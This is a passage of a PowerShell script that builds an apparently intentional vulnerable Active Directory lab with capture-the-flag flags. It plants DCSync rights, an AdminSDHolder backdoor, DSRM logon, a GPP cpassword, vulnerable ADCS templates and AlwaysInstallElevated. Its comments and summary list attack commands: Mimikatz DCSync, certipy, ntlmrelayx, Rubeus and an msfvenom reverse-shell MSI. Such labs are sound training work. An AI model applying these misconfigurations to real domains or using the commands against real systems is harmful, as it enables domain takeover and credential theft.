# ATTACK: Compromise svc_backup (Kerberoast it) ->
#         Mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt
#         -> Get krbtgt hash -> Forge Golden Ticket
# Tool: Mimikatz / impacket secretsdump.py -just-dc svc_backup:p@ssw0rd@DC-01
Write-Host "  [*] DCSync rights: svc_backup" -ForegroundColor Cyan
Set-DCSyncRights -PrincipalSam "svc_backup"

# --- 13f: ForceChangePassword ---
# fahad.salem (Helpdesk Lead) can force-reset faisal.omar's password.
# ATTACK: Compromise fahad.salem ->
#         net user faisal.omar NewPass1! /domain -> login as Finance Director
# Tool: PowerView Set-DomainUserPassword -Identity faisal.omar -AccountPassword (New-Object PSCredential "x",(ConvertTo-SecureString "NewPass!" -AsPlainText -Force)).Password
Write-Host "  [*] ForceChangePassword: fahad.salem -> faisal.omar" -ForegroundColor Cyan
Set-ForceChangePassword -GranteeSam "fahad.salem" -TargetSam "faisal.omar"

# --- 13g: AddMember on privileged group ---
# tariq.dev has AddMember right on "Key Admins Team" group.
# ATTACK: Compromise tariq.dev -> Add self to Key Admins Team ->
#         Key Admins Team has special access to security resources
# Tool: Add-ADGroupMember OR PowerView Add-DomainGroupMember
Write-Host "  [*] AddMember: tariq.dev -> Key Admins Team" -ForegroundColor Cyan
Set-ADACE -TargetDN (Get-ADGroup "Key Admins Team").DistinguishedName `
          -PrincipalSam "tariq.dev" `
          -Rights ([System.DirectoryServices.ActiveDirectoryRights]"Self,WriteProperty") `
          -Inheritance None

# --- 13h: AllExtendedRights on OU (includes LAPS read + ForceChangePassword) ---
# contractor.mutaeb has AllExtendedRights on HR OU.
# ATTACK: Read LAPS passwords of all computers in HR OU, reset HR user passwords
Write-Host "  [*] AllExtendedRights: contractor.mutaeb -> HR OU" -ForegroundColor Cyan
Set-ADACE -TargetDN $OU_HR -PrincipalSam "contractor.mutaeb" `
          -Rights ([System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight) `
          -Inheritance ([System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents)

# --- 13i: Shadow Credentials (GenericWrite on computer -> msDS-KeyCredentialLink) ---
# omar.coder has GenericWrite on WEB-SRV-01.
# ATTACK: Compromise omar.coder ->
#         Whisker.exe add /target:WEB-SRV-01$ -> adds a key credential ->
#         Authenticate as WEB-SRV-01$ via PKINIT Kerberos ->
#         Get NT hash via PKINIT UnPAC-the-hash -> Pass-the-Hash
# Prerequisite: ADCS must be present (which it is in this lab)
Write-Host "  [*] Shadow Credentials path: omar.coder -> WEB-SRV-01" -ForegroundColor Cyan
$ws1DN = (Get-ADComputer "WEB-SRV-01").DistinguishedName
Set-ADACE -TargetDN $ws1DN -PrincipalSam "omar.coder" `
          -Rights ([System.DirectoryServices.ActiveDirectoryRights]::GenericWrite) `
          -Inheritance None

#endregion

#region SECTION 14 - AdminSDHolder Persistence
# -----------------------------------------------------------------------------
# AdminSDHolder is a container in CN=System that acts as a template ACL for
# all protected accounts (adminCount=1): Domain Admins, Enterprise Admins, etc.
# Every 60 minutes the SDProp process applies the AdminSDHolder ACL to ALL
# protected objects, overwriting any manual ACL changes.
#
# MISCONFIGURATION: Give svc_backup GenericAll on AdminSDHolder.
# ATTACK: After compromising svc_backup ->
#         Wait 60 min (or force SDProp via LDAP) ->
#         svc_backup will have GenericAll on ALL Domain Admins permanently.
# Force SDProp manually:
#   $root = [ADSI]"LDAP://CN=System,$DomainDN"
#   $task = $root.Children | Where-Object { $_.Name -eq "AB8153B7-13C8-49F4-97F6-52B4A9EB7C62" }
#   Invoke-Expression 'ldifde -i -f trigger_sdprop.ldif'  (see comments below)
# Better: Set runProtectAdminGroupsTask attribute via PowerShell
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 14] AdminSDHolder Persistence" -ForegroundColor Magenta

$adminSDHolderDN = "CN=AdminSDHolder,CN=System,$DomainDN"
Set-ADACE -TargetDN $adminSDHolderDN -PrincipalSam "svc_backup" `
          -Rights ([System.DirectoryServices.ActiveDirectoryRights]::GenericAll) `
          -Inheritance None
Write-Host "  [!] svc_backup has GenericAll on AdminSDHolder -> affects all DA/EA after SDProp runs" -ForegroundColor Yellow

#endregion

#region SECTION 15 - DSRM Abuse
# -----------------------------------------------------------------------------
# DSRM (Directory Services Restore Mode) is a local admin account on every DC.
# By default it can only login in recovery mode (F8 boot).
#
# MISCONFIGURATION: Setting DsrmAdminLogonBehavior = 2 allows DSRM login
# while the DC is running normally with network logons.
#
# ATTACK:
#   1. Dump DSRM hash: mimikatz lsadump::sam (needs SYSTEM on DC) OR
#      reg save HKLM\SAM sam.hive / reg save HKLM\SYSTEM sys.hive
#   2. Pass-the-Hash using DSRM hash against \\DC-01
#      Mimikatz sekurlsa::pth /user:Administrator /domain:DC-01 /ntlm:<DSRM-hash>
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 15] DSRM Abuse - Enabling network logon for DSRM account" -ForegroundColor Magenta

try {
    $regPath = "HKLM:\System\CurrentControlSet\Control\Lsa"
    Set-ItemProperty -Path $regPath -Name "DsrmAdminLogonBehavior" -Value 2 -Type DWord
    Write-Host "  [+] DsrmAdminLogonBehavior = 2 (DSRM can log in while DC is running)" -ForegroundColor Green
    Write-Host "  [!] Attack: dump DSRM hash from SAM hive -> Pass-the-Hash as local admin on DC" -ForegroundColor Yellow
} catch {
    Write-Host "  [!] DSRM registry: $_" -ForegroundColor Red
}

#endregion

#region SECTION 16 - GPP/SYSVOL Password (Groups.xml)
# -----------------------------------------------------------------------------
# Group Policy Preferences (GPP) stored passwords are encrypted with a known
# AES key that Microsoft published in 2012 (MS14-025).
# Any domain user can read files in SYSVOL, so this is a trivial credential leak.
#
# ATTACK: Find Groups.xml in SYSVOL (no credentials needed from domain-joined host)
#   Get-ChildItem -Path "\\$DomainFQDN\SYSVOL" -Recurse -Filter "Groups.xml"
#   Then decrypt with: gpp-decrypt <cpassword> OR Get-GPPPassword (PowerSploit)
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 16] Creating GPP/SYSVOL password file" -ForegroundColor Magenta

try {
    # Compute cpassword for "p@ssw0rd" using the public GPP AES key
    $gppKey = [byte[]](
        0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
        0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b
    )
    $plainBytes = [System.Text.Encoding]::Unicode.GetBytes("p@ssw0rd")
    $padLen     = [Math]::Ceiling($plainBytes.Length / 16) * 16
    $padded     = New-Object byte[] $padLen
    [Array]::Copy($plainBytes, $padded, $plainBytes.Length)

    $aes             = [System.Security.Cryptography.Aes]::Create()
    $aes.Key         = $gppKey
    $aes.IV          = New-Object byte[] 16
    $aes.Mode        = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding     = [System.Security.Cryptography.PaddingMode]::None
    $enc             = $aes.CreateEncryptor()
    $encrypted       = $enc.TransformFinalBlock($padded, 0, $padded.Length)
    $cpassword       = [Convert]::ToBase64String($encrypted)

    $fakePolicyGUID = "{8A4B7D3C-2F1E-4C9A-B5D6-0E3F7A2C1B4D}"
    $sysvolPath     = "C:\Windows\SYSVOL\sysvol\$DomainFQDN\Policies\$fakePolicyGUID\Machine\Preferences\Groups"
    New-Item -ItemType Directory -Path $sysvolPath -Force | Out-Null

    $groupsXml = @"
<?xml version="1.0" encoding="UTF-8" ?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
        name="LocalAdmin" image="2" changed="2023-01-15 10:22:33" uid="{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}">
    <Properties action="U" fullName="Local Administrator" description="Lab local admin"
                cpassword="$cpassword" changeLogon="0" noChange="0"
                neverExpires="1" acctDisabled="0" userName="LocalAdmin"/>
  </User>
</Groups>
"@
    $groupsXml | Out-File -FilePath "$sysvolPath\Groups.xml" -Encoding UTF8
    Write-Host "  [+] GPP Groups.xml created at: $sysvolPath" -ForegroundColor Green
    Write-Host "  [!] Attack: Get-ChildItem \\$DomainFQDN\SYSVOL -Recurse -Filter Groups.xml | gpp-decrypt" -ForegroundColor Yellow
} catch {
    Write-Host "  [!] GPP file creation failed: $_" -ForegroundColor Red
}

#endregion

#region SECTION 17 - Machine Account Quota
# -----------------------------------------------------------------------------
# Default: any domain user can add up to 10 machines.
# Used in RBCD attacks (create machine account as attacker).
# Tool: PowerMad New-MachineAccount -MachineAccount "AttackerPC" -Password (ConvertTo-SecureString p@ssw0rd -AsPlainText -Force)
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 17] Setting Machine Account Quota" -ForegroundColor Magenta
try {
    Set-ADDomain -Identity $DomainFQDN -Replace @{'ms-DS-MachineAccountQuota' = 10}
    Write-Host "  [+] ms-DS-MachineAccountQuota = 10 (any user can add 10 machines)" -ForegroundColor Green
} catch {
    Write-Host "  [!] MachineAccountQuota: $_" -ForegroundColor Red
}

#endregion

#region SECTION 18 - ADCS (Active Directory Certificate Services)
# -----------------------------------------------------------------------------
# ESC1  : Enrollee supplies Subject Alternative Name -> impersonate any user
# ESC2  : Any Purpose EKU template -> abuse for client auth
# ESC3  : Enrollment Agent template -> enroll on behalf of another user
# ESC4  : Low-priv user has WriteDACL on template -> modify it to ESC1
# ESC6  : EDITF_ATTRIBUTESUBJECTALTNAME2 on CA -> SAN in any template request
# ESC7  : Low-priv user is CA Manager -> can approve requests or issue certs
# ESC8  : Web enrollment over HTTP -> NTLM relay to get certificate
#
# Primary tool: certipy (Python) or Certify.exe
# certipy find -u attacker.01@corp.local -p p@ssw0rd -dc-ip <DC-IP>
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 18] Configuring ADCS" -ForegroundColor Magenta

# --- Install ADCS role if missing ---
$adcsFeature = Get-WindowsFeature -Name AD-Certificate -ErrorAction SilentlyContinue
if ($adcsFeature -and -not $adcsFeature.Installed) {
    Write-Host "  [*] Installing ADCS role (this may take a few minutes)..." -ForegroundColor Cyan
    try {
        Install-WindowsFeature -Name AD-Certificate,ADCS-Cert-Authority,ADCS-Web-Enrollment `
                               -IncludeManagementTools -ErrorAction Stop
        Write-Host "  [+] ADCS role installed" -ForegroundColor Green
    } catch {
        Write-Host "  [!] ADCS install failed: $_" -ForegroundColor Red
    }
} else {
    Write-Host "  [~] ADCS role already installed" -ForegroundColor Yellow
}

# --- Configure CA if not already configured ---
$caName = "corp-$DCHostname-CA"
$caConfigured = Get-Service -Name CertSvc -ErrorAction SilentlyContinue
if (-not $caConfigured) {
    Write-Host "  [*] Configuring Enterprise Root CA: $caName ..." -ForegroundColor Cyan
    try {
        Install-AdcsCertificationAuthority `
            -CAType EnterpriseRootCa `
            -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
            -KeyLength 2048 `
            -HashAlgorithmName SHA256 `
            -CACommonName $caName `
            -CADistinguishedNameSuffix "DC=corp,DC=local" `
            -DatabaseDirectory "C:\Windows\system32\CertLog" `
            -Force -ErrorAction Stop
        Write-Host "  [+] CA configured: $caName" -ForegroundColor Green
    } catch {
        Write-Host "  [!] CA configuration: $_" -ForegroundColor Red
    }
} else {
    Write-Host "  [~] CertSvc running - CA already configured" -ForegroundColor Yellow
}

# --- Enable web enrollment for ESC8 ---
# ESC8: NTLM relay -> POST to http://DC-01/certsrv/certfnsh.asp -> get cert as any user
Write-Host "  [*] Enabling Web Enrollment (ESC8)..." -ForegroundColor Cyan
try {
    Install-AdcsWebEnrollment -Force -ErrorAction SilentlyContinue
    Write-Host "  [+] Web Enrollment enabled at http://$DCHostname/certsrv" -ForegroundColor Green
    Write-Host "  [!] ESC8 attack: impacket ntlmrelayx.py -t http://$DCHostname/certsrv/certfnsh.asp --adcs --template DomainController" -ForegroundColor Yellow
} catch {
    Write-Host "  [~] Web Enrollment: $_" -ForegroundColor Yellow
}

# --- ESC6: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA ---
# Allows SAN specification in ANY template request, even those not flagged for it.
# ATTACK: certipy req -u attacker.01@corp.local -p p@ssw0rd -ca $caName -template User -upn administrator@corp.local
Write-Host "  [*] ESC6: Enabling EDITF_ATTRIBUTESUBJECTALTNAME2..." -ForegroundColor Cyan
try {
    & certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2 | Out-Null
    Restart-Service -Name CertSvc -Force -ErrorAction SilentlyContinue
    Write-Host "  [+] EDITF_ATTRIBUTESUBJECTALTNAME2 enabled (ESC6)" -ForegroundColor Green
} catch {
    Write-Host "  [!] ESC6 flag: $_" -ForegroundColor Red
}

# --- Create vulnerable certificate templates ---
# Wait for CA service to be ready
Start-Sleep -Seconds 5

# ESC1: Enrollee supplies SAN + Client Auth EKU + no approval
# ATTACK: certipy req -u attacker.01@corp.local -p p@ssw0rd -ca $caName
#         -template ESC1-LabAltName -upn administrator@corp.local
#         certipy auth -pfx administrator.pfx -dc-ip <IP>
New-VulnerableCertTemplate `
    -TemplateName   "ESC1-LabAltName" `
    -DisplayName    "Lab - User Alt Name (ESC1)" `
    -NameFlag       1 `
    -EnrollFlag     0 `
    -EKUs           @("1.3.6.1.5.5.7.3.2") `
    -LowPrivEnroll  $true

# ESC2: Any Purpose EKU - can be used as enrollment agent or for client auth
# ATTACK: Use like ESC3 - request an enrollment agent cert, then enroll on behalf of admin
New-VulnerableCertTemplate `
    -TemplateName   "ESC2-AnyPurpose" `
    -DisplayName    "Lab - Any Purpose (ESC2)" `
    -NameFlag       0 `
    -EnrollFlag     0 `
    -EKUs           @("2.5.29.37.0") `
    -LowPrivEnroll  $true

# ESC3: Certificate Request Agent EKU
# ATTACK Step 1: Get enrollment agent cert
#   certipy req -u attacker.01@corp.local -p p@ssw0rd -ca $caName -template ESC3-Agent
# ATTACK Step 2: Enroll on behalf of Administrator using agent cert
#   certipy req -u attacker.01@corp.local -p p@ssw0rd -ca $caName -template User
#              -on-behalf-of corp\Administrator -pfx agent.pfx
New-VulnerableCertTemplate `
    -TemplateName   "ESC3-EnrollAgent" `
    -DisplayName    "Lab - Enrollment Agent (ESC3)" `
    -NameFlag       0 `
    -EnrollFlag     0 `
    -EKUs           @("1.3.6.1.4.1.311.20.2.1") `
    -LowPrivEnroll  $true

# ESC4: Domain Users has WriteDACL on this template -> can modify it to ESC1
# ATTACK: certipy template -u attacker.01@corp.local -p p@ssw0rd -template ESC4-Writable -save-old
#         (certipy modifies the template to add ESC1 flags, then exploits as ESC1)
New-VulnerableCertTemplate `
    -TemplateName   "ESC4-Writable" `
    -DisplayName    "Lab - Writable Template (ESC4)" `
    -NameFlag       0 `
    -EnrollFlag     0 `
    -EKUs           @("1.3.6.1.5.5.7.3.2") `
    -LowPrivEnroll  $true

# Add WriteDACL on ESC4 template for Domain Users
try {
    $configNC  = (Get-ADRootDSE).configurationNamingContext
    $tmplCont  = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
    $esc4DN    = "CN=ESC4-Writable,$tmplCont"
    $duSID     = [System.Security.Principal.SecurityIdentifier](Get-ADGroup "Domain Users").SID
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $duSID,
        [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $acl = Get-Acl "AD:\$esc4DN"
    $acl.AddAccessRule($ace)
    Set-Acl "AD:\$esc4DN" $acl
    Write-Host "  [+] Domain Users have WriteDACL on ESC4-Writable template (ESC4)" -ForegroundColor Green
} catch {
    Write-Host "  [!] ESC4 WriteDACL: $_" -ForegroundColor Red
}

# ESC7: Add noura.ahmed to Certificate Managers (can approve pending cert requests)
# ATTACK: As noura.ahmed, approve a pending request or enable SubCA template
# Tool: certipy ca -u noura.ahmed@corp.local -p p@ssw0rd -ca $caName -enable-template SubCA
try {
    Add-LocalGroupMember -Group "Certificate Managers" -Member "CORP\noura.ahmed" -ErrorAction SilentlyContinue
    Write-Host "  [+] ESC7: noura.ahmed added to Certificate Managers" -ForegroundColor Green
} catch {
    Write-Host "  [~] ESC7 Certificate Managers: $_" -ForegroundColor Yellow
}

# Publish templates to CA
Write-Host "  [*] Publishing templates to CA..." -ForegroundColor Cyan
foreach ($t in @("ESC1-LabAltName","ESC2-AnyPurpose","ESC3-EnrollAgent","ESC4-Writable")) {
    try {
        & certutil -setcatemplate "+$t" 2>&1 | Out-Null
        Write-Host "  [+] Published: $t" -ForegroundColor Green
    } catch {
        Write-Host "  [~] Publish $t : $_" -ForegroundColor Yellow
    }
}

#endregion

#region SECTION 19 - AlwaysInstallElevated via GPO
# -----------------------------------------------------------------------------
# ATTACK: Any user can install MSI files as SYSTEM.
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o evil.msi
# msiexec /quiet /qn /i evil.msi   -> SYSTEM shell
# Verify: Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer AlwaysInstallElevated
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 19] AlwaysInstallElevated GPO" -ForegroundColor Magenta

try {
    $gpModule = Get-Module -ListAvailable -Name GroupPolicy -ErrorAction SilentlyContinue
    if ($gpModule) {
        Import-Module GroupPolicy -ErrorAction SilentlyContinue
        $gpoName = "Lab-AlwaysInstallElevated"
        $gpo = Get-GPO -Name $gpoName -ErrorAction SilentlyContinue
        if (-not $gpo) { $gpo = New-GPO -Name $gpoName }

        Set-GPRegistryValue -Name $gpoName -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" `
                            -ValueName AlwaysInstallElevated -Type DWord -Value 1 | Out-Null
        Set-GPRegistryValue -Name $gpoName -Key "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" `
                            -ValueName AlwaysInstallElevated -Type DWord -Value 1 | Out-Null
        New-GPLink -Name $gpoName -Target $DomainDN -ErrorAction SilentlyContinue | Out-Null
        Write-Host "  [+] GPO '$gpoName' created and linked to domain" -ForegroundColor Green
    } else {
        Write-Host "  [~] GroupPolicy module not available - set AlwaysInstallElevated manually" -ForegroundColor Yellow
    }
} catch {
    Write-Host "  [!] AlwaysInstallElevated GPO: $_" -ForegroundColor Red
}

#endregion

#region SECTION 20 - Disabled Users
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 20] Creating Disabled Users" -ForegroundColor Magenta

New-ADUserSafe @{
    SamAccountName    = "old.admin"
    Name              = "Old Admin"
    UserPrincipalName = "old.admin@$DomainFQDN"
    Path              = $OU_Dis
    AccountPassword   = $LabPassword
    Enabled           = $false
    Description       = "Former Domain Admin - disabled 2021 - was member of DA group - flag{disabled_old_admin}"
}

New-ADUserSafe @{
    SamAccountName    = "temp.mutaeb"
    Name              = "Temp Mutaeb"
    UserPrincipalName = "temp.mutaeb@$DomainFQDN"
    Path              = $OU_Dis
    AccountPassword   = $LabPassword
    Enabled           = $false
    Description       = "Contractor 2022 - VPN user:temp.mutaeb pass:p@ssw0rd - cert still valid 2025"
}

New-ADUserSafe @{
    SamAccountName    = "svc_old_crm"
    Name              = "svc_old_crm"
    UserPrincipalName = "svc_old_crm@$DomainFQDN"
    Path              = $OU_Dis
    AccountPassword   = $LabPassword
    Enabled           = $false
    Description       = "Old CRM service account - had SPN, SQL access. Disabled but still referenced in ACLs."
}

#endregion

#region SECTION 21 - Interesting Attributes (info + extensionAttribute)
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 21] Setting juicy LDAP attributes" -ForegroundColor Magenta

$infoAttr = @{
    "ahmad.ali"       = "SSH key: C:\Users\ahmad.ali\.ssh\id_rsa - backup at \\DC-01\IT\ssh_keys"
    "sara.khalid"     = "Payroll share pw same as AD. SAP login: sara.khalid / p@ssw0rd"
    "svc_sql"         = "SA password (old): p@ssw0rd - still active on DEV-SQL server"
    "faisal.omar"     = "Finance PIN: 9921 - flag{ldap_info_faisal_crtp}"
    "hamad.ceo"       = "KeePass at \\DC-01\Management\corp.kdbx master: p@ssw0rd"
    "temp.mutaeb"     = "Disabled but SSL cert valid until 2025-06 - contact ahmad.ali"
}

foreach ($sam in $infoAttr.Keys) {
    try {
        Set-ADUser -Identity $sam -Replace @{ info = $infoAttr[$sam] }
        Write-Host "  [+] info attr: $sam" -ForegroundColor Green
    } catch {
        Write-Host "  [!] info attr $sam : $_" -ForegroundColor Red
    }
}

# extensionAttribute1 flags (requires Exchange schema or base AD schema v87+)
$extAttr = @{
    "reem.sultan"      = "flag{desc_enum_reem_crtp}"
    "walid.saeed"      = "flag{asrep_walid_crte}"
    "svc_sql"          = "flag{kerberoast_sql_crte}"
    "noura.ahmed"      = "flag{acl_genericall_crte}"
    "svc_backup"       = "flag{dcsync_backup_crte}"
}

foreach ($sam in $extAttr.Keys) {
    try {
        Set-ADUser -Identity $sam -Replace @{ extensionAttribute1 = $extAttr[$sam] }
        Write-Host "  [+] extensionAttribute1: $sam" -ForegroundColor Green
    } catch {
        Write-Host "  [~] extensionAttribute1 not available for $sam (no Exchange schema)" -ForegroundColor Yellow
    }
}

#endregion

#region SECTION 22 - Group Memberships
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 22] Assigning group memberships" -ForegroundColor Magenta

# IT Admins
Add-MemberSafe "IT Admins" "ahmad.ali"
Add-MemberSafe "IT Admins" "fahad.salem"      # MISCONFIGURATION: Helpdesk lead in IT Admins

# Helpdesk
Add-MemberSafe "Helpdesk" "fahad.salem"
Add-MemberSafe "Helpdesk" "khalid.nasser"

# Helpdesk nested in Server Operators (nested privesc path)
# ATTACK: Helpdesk member -> inherits Server Operators -> can log on to DCs locally
Add-MemberSafe "Server Operators" "Helpdesk"

# HR Users
Add-MemberSafe "HR Users" "sara.khalid"
Add-MemberSafe "HR Users" "maryam.hassan"
Add-MemberSafe "HR Users" "reem.sultan"
Add-MemberSafe "HR Users" "hessa.jaber"

# Finance Users
Add-MemberSafe "Finance Users" "faisal.omar"
Add-MemberSafe "Finance Users" "dana.rashid"
Add-MemberSafe "Finance Users" "walid.saeed"
Add-MemberSafe "Finance Users" "nada.mubarak"

# Dev Team
Add-MemberSafe "Dev Team" "tariq.dev"
Add-MemberSafe "Dev Team" "omar.coder"
Add-MemberSafe "Dev Team" "lina.script"
Add-MemberSafe "Dev Team" "nasser.web"
Add-MemberSafe "Dev Leads" "tariq.dev"

# SQL Admins - MISCONFIGURATION: faisal.omar (Finance Director) is in SQL Admins
Add-MemberSafe "SQL Admins" "svc_sql"
Add-MemberSafe "SQL Admins" "svc_mssql"
Add-MemberSafe "SQL Admins" "faisal.omar"    # MISCONFIGURATION

# Backup Operators Team - svc_backup (which has DCSync) is member
Add-MemberSafe "Backup Operators Team" "svc_backup"

# Certificate Managers Team
Add-MemberSafe "Certificate Managers Team" "noura.ahmed"

# VPN Users
Add-MemberSafe "VPN Users" "tariq.dev"
Add-MemberSafe "VPN Users" "omar.coder"
Add-MemberSafe "VPN Users" "contractor.mutaeb"
Add-MemberSafe "VPN Users" "attacker.01"

# Contractors
Add-MemberSafe "Contractors" "contractor.mutaeb"

#endregion

#region SECTION 23 - Helpdesk delegation over HR OU (password reset)
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 23] Delegating Helpdesk -> HR OU password reset" -ForegroundColor Magenta

try {
    $helpdeskSID   = [System.Security.Principal.SecurityIdentifier](Get-ADGroup "Helpdesk").SID
    $resetGUID     = [GUID]"00299570-246d-11d0-a768-00aa006e0529"
    $userClassGUID = [GUID]"bf967aba-0de6-11d0-a285-00aa003049e2"
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $helpdeskSID,
        [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
        [System.Security.AccessControl.AccessControlType]::Allow,
        $resetGUID,
        [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents,
        $userClassGUID
    )
    $acl = Get-Acl "AD:\$OU_HR"
    $acl.AddAccessRule($ace)
    Set-Acl "AD:\$OU_HR" $acl
    Write-Host "  [+] Helpdesk can reset passwords in HR OU" -ForegroundColor Green
} catch {
    Write-Host "  [!] HR delegation: $_" -ForegroundColor Red
}

#endregion

#region SECTION 24 - Summary
# =============================================================================
Write-Host ""
Write-Host "=================================================================" -ForegroundColor Cyan
Write-Host "       corp.local LAB SETUP COMPLETE - ATTACK PATHS BELOW       " -ForegroundColor Cyan
Write-Host "=================================================================" -ForegroundColor Cyan

Write-Host "`n[CREDENTIALS] All accounts use password: p@ssw0rd" -ForegroundColor White
$creds = @(
    [pscustomobject]@{User="ahmad.ali";         Role="IT Admin";             Group="IT Admins"},
    [pscustomobject]@{User="fahad.salem";        Role="Helpdesk Lead";        Group="IT Admins,Helpdesk"},
    [pscustomobject]@{User="khalid.nasser";      Role="Helpdesk";             Group="Helpdesk"},
    [pscustomobject]@{User="noura.ahmed";        Role="Security Analyst / CA Mgr"; Group="Cert Managers Team"},
    [pscustomobject]@{User="sara.khalid";        Role="HR Manager";           Group="HR Users"},
    [pscustomobject]@{User="maryam.hassan";      Role="HR Coordinator";       Group="HR Users"},
    [pscustomobject]@{User="reem.sultan";        Role="HR Assistant";         Group="HR Users"},
    [pscustomobject]@{User="faisal.omar";        Role="Finance Director";     Group="Finance Users,SQL Admins"},
    [pscustomobject]@{User="dana.rashid";        Role="Accounts Payable";     Group="Finance Users"},
    [pscustomobject]@{User="walid.saeed";        Role="Finance Analyst [ASREP]"; Group="Finance Users"},
    [pscustomobject]@{User="tariq.dev";          Role="Dev Lead [RBCD path]"; Group="Dev Team,Dev Leads"},
    [pscustomobject]@{User="omar.coder";         Role="Developer";            Group="Dev Team"},
    [pscustomobject]@{User="lina.script";        Role="DevOps [ASREP]";       Group="Dev Team"},
    [pscustomobject]@{User="svc_sql";            Role="Svc [KERBEROAST+DCSync]"; Group="SQL Admins"},
    [pscustomobject]@{User="svc_iis";            Role="Svc [KERBEROAST+Constrained]"; Group="-"},
    [pscustomobject]@{User="svc_mssql";          Role="Svc [KERBEROAST+Constrained]"; Group="SQL Admins"},
    [pscustomobject]@{User="svc_web";            Role="Svc [Unconstrained]";  Group="-"},
    [pscustomobject]@{User="svc_backup";         Role="Svc [DCSync+AdminSDHolder]"; Group="Backup Operators Team"},
    [pscustomobject]@{User="contractor.mutaeb";  Role="Contractor [ASREP]";   Group="Contractors,VPN Users"},
    [pscustomobject]@{User="attacker.01";        Role="Trainee (low priv)";   Group="VPN Users"}
)
$creds | Format-Table -AutoSize

Write-Host "`n[ATTACK PATHS]" -ForegroundColor Yellow

Write-Host "`n  [1] KERBEROASTING" -ForegroundColor Red
Write-Host "      Targets : svc_sql, svc_iis, svc_mssql, svc_exchange, svc_web, svc_backup"
Write-Host "      Tool    : Rubeus kerberoast /outfile:hashes.txt"
Write-Host "      Tool    : impacket GetUserSPNs.py corp.local/attacker.01:p@ssw0rd"
Write-Host "      Crack   : hashcat -m 13100 hashes.txt rockyou.txt"

Write-Host "`n  [2] AS-REP ROASTING" -ForegroundColor Red
Write-Host "      Targets : walid.saeed, lina.script, contractor.mutaeb"
Write-Host "      Tool    : Rubeus asreproast /format:hashcat /outfile:asrep.txt"
Write-Host "      Tool    : impacket GetNPUsers.py corp.local/ -usersfile users.txt"
Write-Host "      Crack   : hashcat -m 18200 asrep.txt rockyou.txt"

Write-Host "`n  [3] UNCONSTRAINED DELEGATION" -ForegroundColor Red
Write-Host "      Targets : WEB-SRV-01 computer, svc_web user"
Write-Host "      Tool    : Rubeus monitor /interval:5 /nowrap (on WEB-SRV-01)"
Write-Host "      Coerce  : SpoolSample.exe DC-01 WEB-SRV-01 (PrinterBug)"
Write-Host "      Coerce  : PetitPotam.py <WEB-SRV-01-IP> DC-01"

Write-Host "`n  [4] CONSTRAINED DELEGATION (Protocol Transition)" -ForegroundColor Red
Write-Host "      Target  : svc_iis -> CIFS/DC-01.corp.local"
Write-Host "      Tool    : Rubeus s4u /user:svc_iis /rc4:<hash> /impersonateuser:Administrator /msdsspn:CIFS/DC-01.corp.local /ptt"

Write-Host "`n  [5] RESOURCE-BASED CONSTRAINED DELEGATION (RBCD)" -ForegroundColor Red
Write-Host "      Path    : tariq.dev -[GenericWrite]-> WEB-SRV-02"
Write-Host "      Step 1  : New-MachineAccount -MachineAccount AttackerPC -Password p@ssw0rd (PowerMad)"
Write-Host "      Step 2  : Set-ADComputer WEB-SRV-02 -PrincipalsAllowedToDelegateToAccount AttackerPC`$"
Write-Host "      Step 3  : Rubeus s4u /user:AttackerPC`$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:CIFS/WEB-SRV-02.corp.local"

Write-Host "`n  [6] ACL ATTACKS" -ForegroundColor Red
Write-Host "      noura.ahmed  -[GenericAll]->   faisal.omar   (reset pw / targeted Kerberoast)"
Write-Host "      khalid.nasser-[GenericWrite]->  svc_sql       (targeted Kerberoasting)"
Write-Host "      ahmad.ali    -[WriteDACL]->    Finance Users  (add self to group)"
Write-Host "      Helpdesk     -[WriteOwner]->   IT Admins      (take ownership -> WriteDACL -> add self)"
Write-Host "      svc_backup   -[DCSync]->       domain NC      (dump all hashes)"
Write-Host "      fahad.salem  -[ForceChangePW]->faisal.omar    (reset Finance Director password)"
Write-Host "      tariq.dev    -[AddMember]->    Key Admins Team"
Write-Host "      omar.coder   -[GenericWrite]->  WEB-SRV-01    (Shadow Credentials via msDS-KeyCredentialLink)"

Write-Host "`n  [7] ADCS ATTACKS" -ForegroundColor Red
Write-Host "      ESC1  : certipy req -u attacker.01@corp.local -p p@ssw0rd -ca corp-$DCHostname-CA -template ESC1-LabAltName -upn administrator@corp.local"
Write-Host "      ESC2  : Use ESC2-AnyPurpose cert as enrollment agent -> ESC3 chain"
